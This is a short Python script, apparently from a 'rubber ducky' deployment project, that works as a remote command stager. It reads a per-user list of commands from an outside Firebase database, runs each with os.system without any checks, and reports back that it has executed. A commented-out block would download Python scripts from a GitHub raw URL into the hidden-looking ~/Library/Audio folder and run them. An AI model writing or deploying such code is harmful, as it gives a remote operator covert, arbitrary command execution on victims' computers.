import requests
import json
import os

PYTHON_PREFIX = "/"

USER = os.environ["USER"]
FIREBASE_URL = "https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app"
GITHUB_URL = "https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main"


rq = requests.get(f"{FIREBASE_URL}/users.json")
userData = rq.json()[USER]

if userData['executed'] == True: exit(0)

for cmd in userData['commands']:
    if not cmd.startswith(PYTHON_PREFIX): 
        os.system(cmd)
        continue

    # cmd = cmd[1:]
    # args = cmd.split(" ")
    # try:
    #     os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{cmd}.py -o ~/Library/Audio/{cmd}.py")
    #     os.system(f"python3 ~/Library/Audio/{cmd}.py {' '.join(args[1:])}")

userData['executed'] = True
requests.patch(f"{FIREBASE_URL}/users/{USER}.json", data=json.dumps(userData))